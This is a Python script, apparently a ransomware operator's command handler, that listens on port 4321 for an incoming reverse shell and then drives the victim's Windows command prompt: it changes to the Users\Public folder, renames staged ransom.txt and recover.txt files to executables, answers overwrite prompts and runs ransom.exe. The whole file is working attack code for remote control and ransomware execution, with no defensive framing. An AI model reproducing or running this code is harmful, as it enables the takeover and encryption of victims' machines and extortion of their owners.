import socket
import subprocess
import time

def start_listener():
    # Set up a socket to listen for incoming connections
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 4321))
    s.listen(5)
    # Comment out the line below if you don't want to print the message
    print("[+] Listening for incoming connections on port 4321")

    # Accept the connection
    client, addr = s.accept()
    print(f"[+] Connection from {addr}")

 
    # client.send("Connection established. You have a reverse shell.\nShell> ".encode())
    a=0
    while True:
        # Receive the command from the client
        command = client.recv(1024).decode()

        # Break the loop if the client wants to exit
        if command.lower() == "exit":
            break

        # Print the received command
        print(f"[+] Received command: {command}")

        if a==1:
            # while command :
            #     command = client.recv(1024).decode()
            #     print(f"[+] a=1 Received command: {command}")
                #client.send(b"\n copy ransom.txt ransom.exe")
                
            client.send(b"\n dir")
            command = client.recv(1024).decode()
            print(f"[+] Last Received command: {command}")
            return

        command_str  = str(command)
        if not 'Public' in command_str:
            client.send(b"\n cd..")
            command = client.recv(1024).decode()
            print(f"[+] Received command: {command}")
            client.send(b"\n cd..")
            command = client.recv(1024).decode()
            print(f"[+] Received command: {command}")
            client.send(b"\ncd Users")
            command = client.recv(1024).decode()
            print(f"[+] Received command: {command}")
            client.send(b"\ncd Public")
            command = client.recv(1024).decode()
            print(f"[+] Received command: {command}")
            #client.send(b"\ncopy recover.txt recover.exe\n")
            client.send(b'\n dir')
            command = client.recv(1024).decode()
            print(f"[+] Received command: {command}")
            
        # client.send(b"\ncd desktop")
        command_str  = str(command)   
        while not 'Public' in  command_str:
                    client.send(b"\n ransom.exe")
                    command = client.recv(1024).decode()
                    command_str  = str(command)
                    print(f"[+] execute ransom command: {command}")     
        if 'Public' in command_str:
            print('execute')

            client.send(b"\ncopy recover.txt recover.exe\n")
            command = client.recv(1024).decode()
            print(f"[+] public command: {command}")

            client.send(b"\ncopy ransom.txt ransom.exe\n")
            command = client.recv(1024).decode()
            print(f"[+] public command: {command}")
            
        
        client.send(b"\n dir")
        command = client.recv(1024).decode()
        if check_finish(command,client):
             return
        print(f"[+] check finish command: {command}")
        

    # Close the connection
    client.close()
    s.close()

def check_finish(command,client):
    command_str  = str(command)
    if 'ransom.exe' in command_str and 'recover.exe' in command_str: 
                
                command = client.recv(1024).decode()                
                command_str  = str(command)
                print(f"[+] clear loop command: {command}")
                print('bucle')
                while 'Overwrite' in  command_str:
                    client.send(b'\nNo')
                    command = client.recv(1024).decode()
                    command_str  = str(command)
                    print(f"[+] overwrite1 command: {command}")
                    
                print('execute ransom.exe')
                client.send(b"\n ransom.exe")
                command = client.recv(1024).decode()                
                command_str  = str(command)
                print(f"[+] try execute ransom command: {command}")
                
                print(f'ending')                
                return True
    else:
         return False

if __name__ == "__main__":
    start_listener()